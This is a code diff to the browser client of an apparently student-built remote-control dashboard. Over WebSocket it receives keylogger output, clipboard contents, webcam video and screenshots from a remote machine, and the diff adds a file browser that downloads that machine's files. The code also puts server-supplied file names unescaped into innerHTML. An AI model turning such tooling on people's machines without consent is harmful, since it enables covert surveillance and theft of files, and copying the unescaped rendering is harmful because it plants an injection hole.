@@ -264,15 +264,24 @@ function updateSystemStatus(type, isActive) {
     if (el) { isActive ? el.classList.add(activeClass) : el.classList.remove(activeClass); }
 }
 
-/* --- CONNECTION --- */
 function connectToServer() {
     const ipInput = document.getElementById("ipInput");
-    const ip = ipInput ? ipInput.value.trim() : '';
+    // Nếu đang ở màn hình Intro thì chưa có ipInput trong main, lấy từ localStorage hoặc input intro
+    let ip = ipInput ? ipInput.value.trim() : '';
+    
+    // Fallback nếu kết nối từ lịch sử scan
+    if (!ip) {
+        const introInput = document.getElementById("intro-ip-input");
+        if (introInput) ip = introInput.value.trim();
+    }
     
     if (!ip) { showToast("Please enter Server IP!", "error"); return; }
     
     localStorage.setItem("auralink_last_ip", ip); 
     saveToHistory(ip);
+
+    // Cập nhật lại UI input chính nếu cần
+    if (ipInput) ipInput.value = ip;
 
     const wsUri = "ws://" + ip + ":8080/";
     
@@ -285,6 +294,10 @@ function connectToServer() {
     try {
         websocket = new WebSocket(wsUri);
         websocket.onopen = () => { 
+            // Ẩn màn hình intro nếu đang hiện
+            const introOverlay = document.getElementById('intro-overlay');
+            if(introOverlay) introOverlay.style.display = 'none';
+
             setConnectedState(true); 
             addActivityLog("Connected: " + ip); 
             showToast("Connected to Server Successfully"); 
@@ -300,15 +313,16 @@ function connectToServer() {
         websocket.onerror = () => { 
             setConnectedState(false); 
             stopDashboardUpdates(); 
+            console.log("WebSocket Error");
         };
-        websocket.onmessage = (e) => { handleIncomingMessage(e.data); };
-    } catch (e) { 
-        showToast("Connection Error: " + e.message, "error");
-        setConnectedState(false); 
-        stopDashboardUpdates(); 
+        // Đã trỏ đúng về hàm xử lý trung tâm
+        websocket.onmessage = (event) => { handleIncomingMessage(event.data); };
+
+    } catch (e) {
+        console.error("Connection Error:", e);
+        showToast("Connection Failed", "error");
     }
 }
-
 function setConnectedState(isConnected) {
     const areaDisconnected = document.getElementById("conn-area-disconnected");
     const areaConnected = document.getElementById("conn-area-connected");
@@ -385,33 +399,38 @@ function stopDashboardUpdates() {
 }
 
 /* --- MESSAGE HANDLER --- */
+/* --- MESSAGE HANDLER (PHIÊN BẢN TỔNG HỢP FIX LỖI) --- */
 function handleIncomingMessage(data) {
+    // 1. Giữ kết nối (Ping/Pong) - QUAN TRỌNG
     if (data.trim() === "pong") { return; }
 
-    if (data.startsWith("FILE_DOWNLOAD|")) {
-        // Cấu trúc: FILE_DOWNLOAD | Tên File | Base64
-        const parts = data.split("|");
-
-        if (parts.length >= 3) {
-            const filename = parts[1];
-            const firstPipe = data.indexOf("|");
-            const secondPipe = data.indexOf("|", firstPipe + 1);
-            
-            if (secondPipe !== -1) {
-                const finalFilename = data.substring(firstPipe + 1, secondPipe);
-                const base64Content = data.substring(secondPipe + 1);
-
-                const isSaved = saveBase64ToDisk(finalFilename, base64Content);
-                
-                if (isSaved) {
-                    addActivityLog("Downloaded: " + finalFilename);
-                    showToast("File Downloaded Successfully");
-                }
-            }
-        }
-        return; 
+    // 2. Xử lý Danh sách File (MỚI - File Manager)
+    if (data.startsWith("DIR_LIST")) {
+        renderFileBrowser(data); 
+        return;
     }
 
+    // 3. Xử lý Tải File (MỚI - Dùng dấu cách làm phân cách)
+    if (data.startsWith("FILE_DOWNLOAD")) {
+        // Cấu trúc: FILE_DOWNLOAD <Tên File> <Base64>
+        const firstSpace = data.indexOf(" ");
+        const lastSpace = data.lastIndexOf(" ");
+
+        if (lastSpace > firstSpace) {
+            const filename = data.substring(firstSpace + 1, lastSpace);
+            const base64Data = data.substring(lastSpace + 1);
+            
+            // Gọi hàm lưu file
+            const isSaved = saveBase64ToDisk(filename, base64Data);
+            if (isSaved) {
+                addActivityLog("Downloaded: " + filename);
+                showToast("File Downloaded Successfully");
+            }
+        }
+        return;
+    }
+
+    // 4. Xử lý Thông tin hệ thống (System Info)
     if (data.startsWith("sys-info ")) {
         const parts = data.substring(9).split("|");
         if (parts.length >= 2) {
@@ -432,17 +451,26 @@ function handleIncomingMessage(data) {
             const chartRam = document.getElementById("chart-ram");
             if(chartRam) { chartRam.style.setProperty('--p', ramVal); chartRam.querySelector('span').innerText = ramVal + "%"; }
         }
+        return;
     }
-    else if (data.startsWith("file ")) {
+
+    // 5. Xử lý Webcam (Video)
+    if (data.startsWith("file ")) {
         handleVideoFile(data.substring(5).trim()); 
         addActivityLog("Webcam video received"); 
         showToast("Webcam Video Received"); 
         updateSystemStatus("webcam", false);
+        return;
     } 
-    else if (data.startsWith("screenshot ")) { handleScreenshotData(data); }
+
+    // 6. Xử lý Screenshot
+    if (data.startsWith("screenshot ")) { 
+        handleScreenshotData(data); 
+        return;
+    }
     
-    // XỬ LÝ CLIPBOARD
-    else if (data.startsWith("CLIPBOARD_DATA:")) {
+    // 7. Xử lý Clipboard
+    if (data.startsWith("CLIPBOARD_DATA:")) {
         const content = data.substring(15); 
         const box = document.getElementById("clip-output");
         if(box) {
@@ -451,86 +479,54 @@ function handleIncomingMessage(data) {
              box.scrollTop = box.scrollHeight;
         }
         showToast("Clipboard Data Received");
+        return;
     }
 
-    // XỬ LÝ KEYLOG FORMAT MỚI
-    else if (data.startsWith("MODE:")) {
-        parseKeylogData(data);
-        showToast("Keylogs Updated");
+    // 8. Xử lý Keylogger
+    if (data.startsWith("MODE:") || data.startsWith("STATUS:") || data.startsWith("---RAW---")) {
+        parseKeylogData(data); // Hàm xử lý thông minh mới
+        return;
     }
-    else if (data.startsWith("KEYLOG_DATA:")) { // Fallback cũ
+    else if (data.startsWith("KEYLOG_DATA:")) { 
+        // Fallback cho định dạng cũ (nếu có)
         const content = data.substring(12);
-        const box = document.getElementById("keylog-text"); // Đổ tạm vào ô text
+        const box = document.getElementById("keylog-text");
         if(box) { box.innerText += content; }
+        return;
     }
 
-    else if (data.startsWith("DANH SACH UNG DUNG")) { 
+    // 9. Xử lý Danh sách Ứng dụng (App List)
+    if (data.startsWith("DANH SACH UNG DUNG")) { 
         renderAppList(data); 
         addActivityLog("App list updated"); 
         showToast("Application List Updated");
+        return;
     }
-    else if (data.includes("PID") && data.includes("RAM")) { 
+
+    // 10. Xử lý Danh sách Tiến trình (Process List)
+    if (data.includes("PID") && data.includes("RAM")) { 
         renderProcessTable(data, "process-list-body"); 
         addActivityLog("Process list updated"); 
         showToast("Process List Updated");
+        return;
     }
-    else {
-        console.log("Server Msg:", data);
+
+    // 11. Các thông báo trạng thái khác từ Server
+    if (true) { // Các tin nhắn dạng text thông thường
         if(data.includes("Keylogger started")) { updateSystemStatus("keylog", true); showToast("Keylogger Started"); }
         if(data.includes("Keylogger stopped")) { updateSystemStatus("keylog", false); showToast("Keylogger Stopped"); }
         if(data.includes("Started recording")) { updateSystemStatus("webcam", true); showToast("Webcam Recording Started"); }
         if(data.includes("Server: Clipboard Monitor")) { showToast(data.replace("Server: ", "")); }
         if(data.includes("Server: OK, speaking")) { showToast("Client is speaking now", "success"); }
 
-        if(data.includes("Server:")) addActivityLog(data.replace("Server: ", ""));
-        if(data.includes("Error") || data.includes("Loi") || data.includes("failed")) showToast(data, "error");
-    }
-}
-
-/* --- KEYLOGGER FUNCTIONS --- */
-function startKeylog() {
-    sendCmd('start-keylog');
-    isKeylogActive = true;
-    const rawBox = document.getElementById("keylog-raw");
-    const textBox = document.getElementById("keylog-text");
-    if(rawBox) rawBox.innerText = "Session started...";
-    if(textBox) textBox.innerText = "Session started...";
-}
-
-function fetchKeylog() { sendCmd('get-keylog'); }
-
-function stopKeylog() {
-    // 1. Bật cờ hiệu thông báo: "Tôi đang muốn dừng và lưu"
-    isKeylogStopping = true;
-    
-    // 2. Gọi lệnh lấy dữ liệu mới nhất (Server sẽ gửi về sau vài mili-giây)
-    sendCmd('get-keylog');
-    
-    // 3. Thông báo cho người dùng biết đang xử lý
-    showToast("Fetching data & Saving...", "info");
-}
-// --- LOGIC MỚI CHO CLIPBOARD ---
-
-function startClipboard() {
-    sendCmd('start-clip');
-    const box = document.getElementById("clip-output");
-    if(box) box.innerText = "Monitoring started...\n-------------------\n";
-}
-
-function stopClipboard() {
-    sendCmd('stop-clip');
-    
-    // Lưu nội dung hiện tại vào History
-    const box = document.getElementById("clip-output");
-    if(box) {
-        let content = box.innerText;
-        // Lọc bớt các dòng thông báo hệ thống
-        content = content.replace("Monitoring started...", "").replace("Waiting for clipboard data...", "").trim();
-        
-        if(content.length > 0) {
-            addToHistory('clipboard', null, content);
-            showToast("Clipboard Data Saved to History");
+        // Log vào Activity
+        if(data.includes("Server:")) {
+            console.log(data);
+            addActivityLog(data.replace("Server: ", ""));
         }
+        
+        // Báo lỗi
+        if(data.includes("Error") || data.includes("Loi") || data.includes("failed")) showToast(data, "error");
     }
 }
 
@@ -1015,19 +1011,36 @@ function saveBase64ToDisk(filename, base64) {
         link.click();
         document.body.removeChild(link);
 
-        // Cập nhật giao diện danh sách
+        // --- XỬ LÝ GIAO DIỆN LỊCH SỬ ---
         const list = document.getElementById("file-download-list");
         if (list) {
             if (list.querySelector(".scan-placeholder")) list.innerHTML = "";
 
+            // Xử lý đường dẫn From:
+            let sourcePathDisplay = "Unknown source";
+            if (currentRemotePath) {
+                sourcePathDisplay = currentRemotePath.endsWith("\\") || currentRemotePath === "MyComputer" 
+                    ? currentRemotePath + filename 
+                    : currentRemotePath + "\\" + filename;
+            }
+
+            // Xử lý đường dẫn To: (Giả lập thư mục Downloads)
+            const destPathDisplay = "Downloads\\" + filename;
+
             const item = document.createElement("div");
             item.className = "file-item";
+            
+            // Cập nhật HTML để hiển thị cả From và To
             item.innerHTML = `
-                <div class="file-info">
+                <div class="file-info" style="overflow: hidden;">
                     <div class="file-icon-box"><i data-lucide="file-check"></i></div>
-                    <div>
-                        <div class="file-name">${filename}</div>
+                    <div style="min-width: 0;">
+                        <div class="file-name" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${filename}</div>
                         <div class="file-path">${(bytes.length / 1024).toFixed(1)} KB • ${new Date().toLocaleTimeString()}</div>
+                        
+                        <div class="file-path-source" title="${sourcePathDisplay}">From: ${sourcePathDisplay}</div>
+                        
+                        <div class="file-path-source" style="color: #3b82f6;" title="Saved to Browser Downloads">To: ${destPathDisplay}</div>
                     </div>
                 </div>
                 <div class="badge-success">Saved</div>
@@ -1043,4 +1056,201 @@ function saveBase64ToDisk(filename, base64) {
         showToast("Error saving file (Invalid Base64)", "error");
         return false; 
     }
+}
+// ======================================================
+// CÁC HÀM HỖ TRỢ FILE MANAGER (Dán vào cuối client.js)
+// ======================================================
+
+let currentRemotePath = "MyComputer"; // Mặc định hiển thị danh sách ổ đĩa trước // Biến lưu đường dẫn hiện tại
+
+// 1. Gửi lệnh yêu cầu danh sách file
+function requestListDirectory(path) {
+    if (!websocket || websocket.readyState !== WebSocket.OPEN) return;
+    
+    // Nếu path rỗng thì mặc định là ổ C
+    if (!path) path = "MyComputer";
+    
+    // Gửi lệnh "ls <path>" sang Server
+    websocket.send("ls " + path);
+
+    // Hiện thông báo đang tải
+    const listContainer = document.getElementById("file-browser-list");
+    if(listContainer) {
+        listContainer.innerHTML = '<div style="padding:20px; text-align:center; color:#666">Loading...</div>';
+    }
+}
+
+// 2. Hàm vẽ giao diện khi nhận được DIR_LIST từ Server
+// Hàm vẽ giao diện khi nhận được DIR_LIST từ Server
+function renderFileBrowser(data) {
+    const lines = data.split("\n");
+    
+    // Dòng 2 chứa đường dẫn hiện tại do Server gửi về
+    if (lines.length > 1) {
+        const serverPath = lines[1].trim();
+        currentRemotePath = serverPath;
+        const pathInput = document.getElementById("currentPath");
+        if (pathInput) pathInput.value = serverPath;
+    }
+
+    const listContainer = document.getElementById("file-browser-list");
+    if (!listContainer) return;
+
+    listContainer.innerHTML = ""; // Xóa danh sách cũ
+
+    // Duyệt từ dòng 3 trở đi (bỏ qua Header và Path)
+    for (let i = 2; i < lines.length; i++) {
+        const line = lines[i].trim();
+        if (!line) continue;
+
+        const parts = line.split("|"); // Tách chuỗi bằng dấu |
+        const type = parts[0]; // [DRIVE], [DIR] hoặc [FILE]
+        const name = parts[1];
+        
+        const itemDiv = document.createElement("div");
+        // Style inline đơn giản để đảm bảo đẹp ngay lập tức
+        itemDiv.style.cssText = "display:flex; justify-content:space-between; padding:8px; border-bottom:1px solid rgba(0,0,0,0.1); align-items:center;";
+        itemDiv.className = "browser-item"; // Class để CSS (nếu có)
+
+        if (type === "[DRIVE]") {
+             // --- [MỚI] Ổ ĐĨA (C:\, D:\...) ---
+             // Xử lý escape dấu \ để truyền vào hàm JS an toàn
+             const safeDrivePath = name.replace(/\\/g, "\\\\");
+
+             itemDiv.innerHTML = `
+                <div style="cursor:pointer; display:flex; align-items:center; gap:10px; flex:1;" onclick="requestListDirectory('${safeDrivePath}')">
+                    <i data-lucide="hard-drive" style="color:#2563eb; fill:#dbeafe; width:20px;"></i>
+                    <span style="font-weight:bold;">${name} (Local Disk)</span>
+                </div>
+            `;
+        }
+        else if (type === "[DIR]") {
+            // --- THƯ MỤC ---
+            // Tạo đường dẫn mới an toàn (thêm dấu \\)
+            const newPath = (currentRemotePath + name + "\\").replace(/\\/g, "\\\\");
+            
+            itemDiv.innerHTML = `
+                <div style="cursor:pointer; display:flex; align-items:center; gap:10px; flex:1;" onclick="requestListDirectory('${newPath}')">
+                    <i data-lucide="folder" style="color:#d97706; fill:#fbbf24; width:20px;"></i>
+                    <span style="font-weight:500;">${name}</span>
+                </div>
+                <button class="btn-mini" onclick="copyPath('${newPath}')" style="font-size:0.7rem; padding:2px 5px;">Copy</button>
+            `;
+        } else {
+            // --- FILE ---
+            const size = parts[2] || "0 KB";
+            // Escape đường dẫn để truyền vào hàm JS
+            const fullPath = (currentRemotePath + name).replace(/\\/g, "\\\\");
+            
+            itemDiv.innerHTML = `
+                <div style="display:flex; align-items:center; gap:10px; flex:1;">
+                    <i data-lucide="file" style="color:#475569; width:20px;"></i>
+                    <span>${name}</span>
+                    <span style="font-size:0.75rem; color:#94a3b8; margin-left:10px;">(${size})</span>
+                </div>
+                <div style="display:flex; gap:5px;">
+                    <button class="btn-mini" onclick="downloadSingleFile('${fullPath}')" style="background:#dbeafe; color:#2563eb; border:none; padding:4px 8px; border-radius:4px; cursor:pointer;">
+                        <i data-lucide="download" style="width:14px;"></i>
+                    </button>
+                </div>
+            `;
+        }
+        listContainer.appendChild(itemDiv);
+    }
+    
+    // Tạo lại icon Lucide (nếu thư viện đã load)
+    if(typeof lucide !== 'undefined') lucide.createIcons();
+}
+
+// 3. Các nút điều hướng
+function refreshDir() {
+    const pathInput = document.getElementById("currentPath");
+    if (pathInput) requestListDirectory(pathInput.value);
+}
+
+function navigateUp() {
+    let path = currentRemotePath;
+    
+    // Nếu đang ở MyComputer rồi thì thôi
+    if (path === "MyComputer") return;
+
+    // Nếu đang ở gốc ổ đĩa (VD: "C:\" hoặc "D:\") -> Về danh sách ổ
+    if (/^[A-Z]:\\$/.test(path)) {
+        requestListDirectory("MyComputer");
+        return;
+    }
+
+    // Logic cũ: Cắt bớt đường dẫn
+    if (path.endsWith("\\")) path = path.slice(0, -1);
+    const lastSlash = path.lastIndexOf("\\");
+    
+    if (lastSlash !== -1) {
+        path = path.substring(0, lastSlash + 1);
+        requestListDirectory(path);
+    } else {
+        // Fallback an toàn
+        requestListDirectory("MyComputer");
+    }
+}
+
+// 4. Xử lý tải file
+// Tìm hàm này ở cuối file client.js
+function downloadSingleFile(fullPath) {
+    if (!websocket) return;
+    
+    // --- SỬA DÒNG NÀY ---
+    // Cũ: websocket.send("download " + fullPath);
+    // Mới: Phải thêm "-file" vào để khớp với main.cpp
+    websocket.send("download-file " + fullPath); 
+    
+    // Có thể thêm toast thông báo ở đây
+    console.log("Requesting: " + fullPath);
+    showToast("Requesting download..."); // Thêm thông báo cho trực quan
+}
+
+// Hàm cho nút Manual Download (Nhập tay)
+function requestDownloadFile() {
+    const input = document.getElementById("filePathInput");
+    if (input && input.value) {
+        downloadSingleFile(input.value);
+    } else {
+        alert("Please enter a file path!");
+    }
+}
+
+// 5. Hàm lưu file Base64 xuống máy (Core)
+function saveBase64File(base64, filename) {
+    try {
+        const binaryString = atob(base64);
+        const len = binaryString.length;
+        const bytes = new Uint8Array(len);
+        for (let i = 0; i < len; i++) {
+            bytes[i] = binaryString.charCodeAt(i);
+        }
+        const blob = new Blob([bytes], { type: "application/octet-stream" });
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = filename;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
+        // Thêm vào lịch sử tải xuống
+        const historyList = document.getElementById("file-download-list");
+        if (historyList) {
+            const item = document.createElement("div");
+            item.style.cssText = "padding:5px; border-bottom:1px solid #eee; display:flex; align-items:center; gap:5px; font-size:0.85rem;";
+            item.innerHTML = `<i data-lucide="check" style="width:14px; color:green"></i> <span>${filename}</span>`;
+            historyList.prepend(item);
+            if(typeof lucide !== 'undefined') lucide.createIcons();
+        }
+    } catch (e) {
+        console.error("Save file error:", e);
+        alert("Error saving file. Base64 format might be invalid.");
+    }
+}
+
+// 6. Tiện ích copy
+function copyPath(text) {
+    navigator.clipboard.writeText(text);
 }
